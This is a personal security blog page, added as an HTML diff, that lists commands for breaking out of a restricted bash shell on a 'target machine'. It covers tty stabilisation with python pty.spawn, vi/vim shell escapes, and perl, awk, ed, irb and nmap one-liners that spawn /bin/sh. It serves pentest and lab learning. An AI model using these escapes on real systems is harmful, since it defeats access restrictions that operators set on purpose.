@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="css/utils.css">
+    <link rel="stylesheet" href="css/style.css">
+    <link rel="stylesheet" href="css/blogpost.css">
+    <title>Hi, I'm Notnue</title>
+    
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-98YN0J0PW4"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-98YN0J0PW4');
+</script>
+
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-N7HPXW3');</script>
+
+</head>
+<body>
+ 
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-N7HPXW3"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+
+    <nav class="navigation max-width-1 m-auto">
+        <div class="nav-left">
+            <br><br>
+            <h1 class="font1">O’cmon, rbash is hated one too!</h1>
+            
+
+    </nav>
+
+    </nav>
+    <div class="max-width-1 m-auto">
+        <hr>
+    
+    <div class="m-auto blog-post-content max-width-2 m-auto my-2">
+        
+        <div class="blogpost-meta">
+         <p class="font1"><img src="img/rbash.jpeg" alt="article"><br>
+            Breaking out of a Restricted shell<br>
+
+            Why do I even care? You have to!!<br>
+            
+            My end goal is spawning a bourne shell.What are the initial steps?<br>
+            
+            Grab a valid tty of your default OS (tty: it’s a teletypewriter for terminal)
+            Your running OS? Take hold of those binaries. But how? by exporting each environment variables
+            You like color coded terminal which showcase easily the Files, Directories, file permissions?
+            Making our shell stable.<br>
+            python -c ‘import pty; pty.spawn(“/bin/bash”)’<br>
+            OR<br>
+            python3 -c ‘import pty; pty.spawn(“/bin/bash”)’<br>
+            export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp<br>
+            export TERM=xterm-256color<br>
+            Ctrl + Z (Background Process.)<br>
+            stty raw -echo ; fg ; reset<br>
+            stty columns 200 rows 200<br>
+            
+            — — — — — — — — — — — — — — →
+            <br>
+            rbash(Restricted Bash shell?)<br>
+            <br>
+            There are various methods. Personally, I like vi because it’s always win-win as this is always available.<br>
+            $ vi<br>
+            :set shell=/bin/sh<br>
+            :shell<br>
+            <br>
+            $ vim<br>
+            :set shell=/bin/sh<br>
+            :shell<br>
+            <br>
+            Is there python on target machine?<br>
+            python -c ‘import pty; pty.spawn(“/bin/bash”)’<br>
+            python -c ‘import pty; pty.spawn(“/bin/sh”)’<br>
+            <br>
+            Is there perl on the target machine?<br>
+            perl -e ‘exec “/bin/bash”;’<br>
+            perl -e ‘exec “/bin/sh”;’<br>
+            <br>
+            Is there AWK on the target machine?<br>
+            awk ‘BEGIN {system(“/bin/bash -i”)}’<br>
+            awk ‘BEGIN {system(“/bin/sh -i”)}’<br>
+            <br>
+            Is there ed on the target machines?<br>
+            ed<br>
+            !sh<br>
+            <br>
+            IRB Present on the target machine?<br>
+            exec “/bin/sh”<br>
+            <br>
+            Is there Nmap on the target machine?<br>
+            nmap — interactive<br>
+            nmap> !sh<br>
+            <br>
+            — — — — — — — — — — — — — — — — — -<br>
+            <br>
+            I hope that might have helped you something.<br>
+            <br>
+            I’m Neelesh, I’ll see you on the internet!<br>
+            
+            
+    </div>
+
+    <div class="max-width-1 m-auto"><hr></div>
+    <div class="home-articles max-width-1 m-auto font2">
+        <h2>People who read this also read</h2>
+        <div class="row">
+
+       
+        <div class="home-article more-post">
+            <div class="home-article-img">
+                <img src="img/linuxprev.png" alt="article">
+            </div>
+            <div class="home-article-content font1 center">
+                <a href="/linuxprev.html"><h3>g0tmilk's Guide to Linux Privilege Escalation as well...</h3></a>
+                
+               
+            </div>
+        </div>
+        <div class="home-article more-post">
+            <div class="home-article-img">
+                <img src="img/1111pm.png" alt="article">
+            </div>
+            <div class="home-article-content font1 center">
+                <a href="/headless.html"><h3>This VM Image is beginner friendly machine. The object of the game is to acq..</h3></a>
+                
+                
+            </div>
+        </div>
+        <div class="home-article more-post">
+            <div class="home-article-img">
+                <img src="img/goldeneye-hack7.png" alt="article">
+            </div>
+            <div class="home-article-content font1 center">
+                <a href="/golden.html"><h3>The intermediate level machine...</h3></a>
+                
+                
+            </div>
+        </div>
+        
+    </div>
+    </div>
+
+    <footer id="footer">
+        <div class="container-fluid">
+            <!-- social media icons -->
+            <div class="social-icons mt-4"><br>
+                
+                
+                
+                <a href="https://www.twitter.com/" target="_blank"><i class="fab fa-twitter"></i></a>
+                <a href="https://www.linkedin.com/user-neeleshpatel" target="_blank"><i class="fab fa-linkedin"></i></a>
+                <a href="https://www.github.com/notnue" target="_blank"><i class="fab fa-github"></i></a>
+            </div>
+        </div>
+    </footer>
+</body>
+</html>
